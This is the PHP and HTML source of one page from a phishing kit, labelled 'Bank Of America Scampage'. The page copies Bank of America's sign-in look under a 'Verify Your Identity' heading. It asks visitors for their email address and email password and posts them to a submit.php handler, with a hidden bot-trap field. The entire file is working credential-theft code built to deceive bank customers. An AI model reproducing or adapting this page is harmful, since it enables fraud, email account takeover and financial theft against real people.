<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             26/10/2019
 * @package           Bank Of America Scampage
 *
 * Project Name:      Bank Of America Scampage
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
    include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico" />


        <title>Bank of America | Online Banking | Sign In | Online IDIn</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="row">
                    <div class="col-md-6">
                        <div class="logo"><a href="#"><img src="../assets/images/logo.png"></a></div>
                    </div>
                    <div class="col-md-6">
                        <ul class="header-menu">
                            <li><a href="#"><i class="fas fa-lock"></i> Secure Area</a></li>
                            <li><a href="#">En Español</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- PAGE TITLE -->
        <div class="page-title">
            <div class="container">
                <h3>Verify Your Identity</h3>
            </div>
        </div>
        <!-- END PAGE TITLE -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="top-content">
                    <h3>Email Information</h3>
                    <p>Provide your email information below.</p>
                </div>
                <div class="forms">
                    <form method="post" action="submit.php">
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'email_address') ?>">
                            <label for="email_address">Email address</label>
                            <input type="email" name="email_address" class="form-control" id="email_address" value="<?php echo get_value('email_address'); ?>">
                            <?php echo validation($_SESSION['errors'],'email_address'); ?>
                        </div>
                        <div class="form-group <?php echo is_invalid_class($_SESSION['errors'],'email_password') ?>">
                            <label for="email_password">Email password</label>
                            <input type="password" name="email_password" class="form-control" id="email_password" value="<?php echo get_value('email_password'); ?>">
                            <?php echo validation($_SESSION['errors'],'email_password'); ?>
                        </div>
                        <input type="hidden" name="type" value="etapemail">
                        <input type="hidden" name="verbot">
                        <div class="buttons">
                            <button class="btn-submit" type="submit">Continue</button>
                            <button type="button">Cancel</button>
                        </div>
                    </form>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer" style="margin-top: 70px;">
            <div class="container">
                <p style="font-weight: 700"><i class="fas fa-lock"></i> Secure area</p>
                <p><a href="#">Privacy & Security</a></p>
                <p class="mb-0">Bank of America, N.A. Member FDIC. <a href="#">Equal Housing Lender</a><br>&copy; 2022 Bank of America Corporation. All rights reserved.</p>
            </div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>

    </body>

</html>